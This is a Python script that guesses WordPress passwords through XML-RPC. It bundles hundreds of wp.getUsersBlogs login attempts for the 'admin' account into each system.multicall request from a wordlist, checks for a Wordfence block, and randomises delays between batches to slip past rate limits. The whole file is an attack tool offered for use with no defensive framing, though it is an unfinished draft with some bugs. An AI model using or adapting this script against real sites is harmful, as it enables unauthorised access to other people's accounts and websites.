import requests
import time 
import random

user = "admin"
payloads_per_request = 500
target_url = ""
 
# delay
min_delay = 2
max_delay = 5
min_delay_seconds = min_delay * 60
max_delay_seconds = max_delay * 60

wordlist = "passwords.txt"

# consts
headers = {'Content-Type': 'application/xml'} 
insertlist = []


def found_credentials(content):
    match_string = "Incorrect username or password."
    if content.count(match_string) == payloads_per_request:
        return False
    # wordfence handling 
    if "Wordfence" in content:
        return False
    # if "admin" in content
    return True

def main():
    n = 0
    with open(wordlist, 'r') as file:
        for i, password in enumerate(file.readlines(), 0):
            
            if i % payloads_per_request == 0:
                print(f"generating output{n+1}")
                n += 1

                insert = "\n".join(insertlist)
                xml ='<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>' +\
                        f'\n {insert}' +\
                    '</data></array></value></param></params></methodCall>'

                response = requests.post('http://httpbin.org/post', data=xml, headers=headers)
                content = response.content.decode("utf-8")
                print(response.status_code)
                if found_credentials(content):
                    print(f"you have been pwned! Payload somewhere in Iteration {i / payloads_per_request}")

                wait_time = random.randrange(min_delay, max_delay) 
                time.sleep(wait_time)
                
                insertlist = []
            else:
                insertlist.append( "<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member>" +\
                f"<name>params</name><value><array><data><value><array><data><value><string>{user}</string>" +\
                f"</value><value><string>{password}</string></value></data></array></value></data></array></value></member></struct></value>\n")

#TODO args support 
#TODO multiple users

